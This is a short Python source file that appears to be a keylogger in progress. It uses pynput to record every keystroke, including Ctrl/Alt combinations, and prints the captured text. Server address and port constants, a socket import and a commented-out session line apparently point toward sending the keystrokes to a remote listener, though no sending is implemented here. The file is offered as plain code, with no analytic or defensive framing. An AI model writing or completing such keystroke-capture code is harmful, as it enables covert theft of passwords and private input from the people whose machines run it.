import ctypes
import socket
import threading
from pynput import keyboard

SERVER_ADDRESS = "127.0.0.1"
SERVER_PORT = 6000

CTRL_STATE, ALT_STATE = False, False

KEY_MAP = {"enter": "\n", "space": " ", "tab": "\t"}


def on_key_press(key):
    global CTRL_STATE, ALT_STATE
    pressed = ""
    
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        CTRL_STATE = True
        return
    elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
        ALT_STATE = True
    
        
    if hasattr(key, "char"):
        if not hasattr(key, "vk"):
            return
        
        elif CTRL_STATE or ALT_STATE:
            pressed = f"[{'CTRL+' if CTRL_STATE else ''}{'ALT+' if ALT_STATE else ''}{chr(key.vk)}]"
        
        else:
            pressed = key.char
        
        
    else:
        pressed = KEY_MAP.get(key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])).upper()
    
    print(pressed)


def on_key_release(key):
    global CTRL_STATE, ALT_STATE
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        CTRL_STATE = False
    elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
        ALT_STATE = False

if __name__ == "__main__":
    #' session = Session(SERVER_ADDRESS, SERVER_PORT)
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()
